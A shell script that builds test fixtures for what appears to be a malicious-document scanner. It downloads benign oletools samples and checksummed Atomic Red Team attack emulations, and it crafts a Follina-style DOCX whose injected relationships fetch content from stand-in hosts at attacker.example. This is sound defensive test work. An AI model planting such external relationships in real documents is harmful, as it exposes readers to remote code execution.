#!/bin/sh
# Benign Office test fixtures from the oletools project, plus a crafted
# Follina/remote-template sample derived from one of them.
set -eu
cd "$(dirname "$0")/.."
mkdir -p testdata/office
python3 -I tests/mkpdf.py testdata   # clean.pdf, evil.pdf, evil2.pdf, text.pdf
cd testdata/office
B=https://raw.githubusercontent.com/decalage2/oletools/master/tests/test-data
for f in msodde/harmless-clean.docx msodde/harmless-clean.doc msodde/dde-test.docx \
         oleobj/embedded-simple-2007.docx oleobj/external_link/sample_with_external_link_to_doc.docx \
         excel4-macros/excel4_sample_macro.xls olevba/sample_with_vba.ppt; do
    curl -fsSLO "$B/$f"
done
python3 -I - <<'PY'
import zipfile
src = zipfile.ZipFile("harmless-clean.docx")
out = zipfile.ZipFile("follina-template.docx", "w", zipfile.ZIP_DEFLATED)
for n in src.namelist():
    d = src.read(n)
    if n == "word/_rels/document.xml.rels":
        d = d.replace(b"</Relationships>", b'<Relationship Id="rIdX1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://attacker.example/payload.html!x-usc:http://attacker.example/payload.html" TargetMode="External"/></Relationships>')
    out.writestr(n, d)
out.writestr("word/_rels/settings.xml.rels", b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdT1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://templates.attacker.example/invoice.dotm" TargetMode="External"/></Relationships>')
out.close()
PY

# Atomic Red Team (Red Canary): Office files reproducing real attack
# techniques with harmless payloads (calc/notepad, Windows only). Pinned to a
# commit and checksummed.
cd ..
mkdir -p atomic
ART=https://raw.githubusercontent.com/redcanaryco/atomic-red-team/388942adbd9641f4dfdcf079d7efe9a75ec0ac43/atomics
while read -r sha path; do
    out="atomic/$(echo "$path" | cut -d/ -f1)-$(basename "$path")"
    if ! echo "$sha  $out" | sha256sum -c --quiet >/dev/null 2>&1; then
        curl -fsSL -o "$out" "$ART/$path"
        echo "$sha  $out" | sha256sum -c --quiet || { echo "checksum mismatch: $path" >&2; exit 1; }
    fi
done <<'LIST'
167d792b9a3d4c22c38dee24a02231f8399f69a47f414a2d2faf1c26e2c95629 T1027/src/T1027-cc-macro.xlsm
6fcce2aa69c452b6666db19509838640b163c1f3030cfb43d2c4176bff1b6154 T1137.006/bin/Addins/ExcelVBAaddin.xlam
5459667525a947db737484486b5b73b0411a9d26ed00d3dcb08b968d907e6401 T1204.002/bin/mirrorblast_emulation.xlsm
db771f81481b0fb47e584479ba7365be67148b22449a06b6ed741c546a5ded61 T1218/src/T1218Test.docx
b4eb1dfa7c18e4462bca7b10f9241e9b4a837aa224797a595d918c9fa1e010b0 T1221/src/Calculator.docx
3f54c217ae346d583ebfc59ca7b13e5199527f2112cba5436c929737b26c8c6c T1221/src/opencalc.dotm
3d703f65c959e34870d7dd036dba47d663532a061343d9845e07a2dd45f2d007 T1559.002/bin/DDE_Document.docx
3a27efe2cf4772b5689adb301b5da6344eef92e28b057badb4d6be553c838e6f T1566.001/bin/PhishingAttachment.xlsm
LIST
